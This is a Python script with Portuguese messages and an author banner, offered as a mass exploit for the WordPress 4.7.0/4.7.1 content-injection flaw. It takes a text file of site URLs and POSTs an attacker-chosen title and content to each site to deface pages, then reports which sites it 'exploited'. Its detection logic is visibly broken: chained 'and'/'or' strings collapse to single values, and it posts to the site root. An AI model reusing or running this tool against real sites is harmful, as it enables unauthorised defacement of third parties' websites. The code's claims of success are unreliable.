#!/usr/bin/python
#-*- coding: utf-8 -*-
import colorama
from colorama import Fore, Back, Style
import requests
import sys
import json
pay_user = "COLOQUE AQUI OQUE VAI APARECER NO SITE"
menu = """
__  __            __                  ______   Recoda nao comedia!              
\ \/ /_  ______  / /_____  __________/ ____/_______ _      __
 \  / / / / __ \/ //_/ _ \/ ___/ ___/ /   / ___/ _ \ | /| / /
 / / /_/ / / / / ,< /  __/ /  (__  ) /___/ /  /  __/ |/ |/ / 
/_/\__,_/_/ /_/_/|_|\___/_/  /____/\____/_/   \___/|__/|__/  
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 # Wordpress 4.7.0 / 4.7.1 Content Injection mass exploit
 # Escrito por Supr3m0 & w4rlo6k
 # Curta: www.facebook.com/yunkers01/
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"""
x = sys.argv
vuln = "status" and "id" and "title" or "data"
vuln_data = {"title" : pay_user,
			"content" : pay_user}
falha = "404" or "401" or "error" or "cannot" or "permissao"
if len(x) == 3:
	if x[1] == "--sites":
		if ".txt" not in x[2]:
			print(Fore.GREEN + menu)
			print(Fore.RED + "[INFO]" + Fore.WHITE +" Extensao da Wordlist invalida (Apenas .txt)")
			exit()
		else:
			word = x[2]
	else:
		print(Fore.GREEN + menu)
		print(Fore.RED + "[INFO]" + Fore.WHITE +" Parametros invalidos!\n    use: python exploit.py --sites sites.txt")
		exit()
else:
	print(Fore.GREEN + menu)
	print(Fore.RED + "[INFO]" + Fore.WHITE +" Parametros invalidos!\n    use: python exploit.py --sites sites.txt")
	exit()

print(Fore.GREEN + menu)
try:
	arquivo = open(word, "r")
	sites = arquivo.readlines()
except:
	print(Fore.RED + "[INFO]" + Fore.WHITE +" Nao consegui ler as linhas da wordlist ou nao encontrei o arquivo {}".format(word))
	exit()
conta = len(sites)
print(Fore.BLUE + "[INFO]" + Fore.WHITE +" Total de sites: {}".format(conta))
print(Fore.GREEN + "[INFO]" + Fore.WHITE +" Iniciando(...)")
print("\n")
for site in sites:
	try:
		if site[:8] != "https://" and site[:7] != "http://":
			print(Fore.RED + "\n[INFO]" + Fore.WHITE + " O site {} nao contem o protocolo HTTP ou HTTPS.\n(Insira o protocolo 'http' ou 'https'.)".format(site))
			exit()
		else:
			print(Fore.BLUE + "[INFO]" + Fore.WHITE + " Inserindo payload em {}".format(site))
			verifica = requests.get(site)
			if vuln in verifica.text:
				injeta = requests.post(site, data=vuln_data)
				if injeta.status_code == 200:
					if falha in verifica.text:
						print(Fore.RED + "[INFO]" + Fore.WHITE + " Site nao vulneravel \n")
					else:
						print(Fore.GREEN + "[SUCESSO]" + Fore.WHITE + " Site explorado :D")
				else:
					print(Fore.RED + "[INFO]" + Fore.WHITE + " Site retornou: {} \n".format(injeta.status_code))
			else:
				print(Fore.RED + "[INFO]" + Fore.WHITE + " Site nao vulneravel \n")
	except Exception as e:
		print(Fore.RED + "\n[INFO]" + Fore.WHITE +" Nao consegui me conectar ao site {}".format(site))
print(Fore.WHITE + "")
arquivo.close()
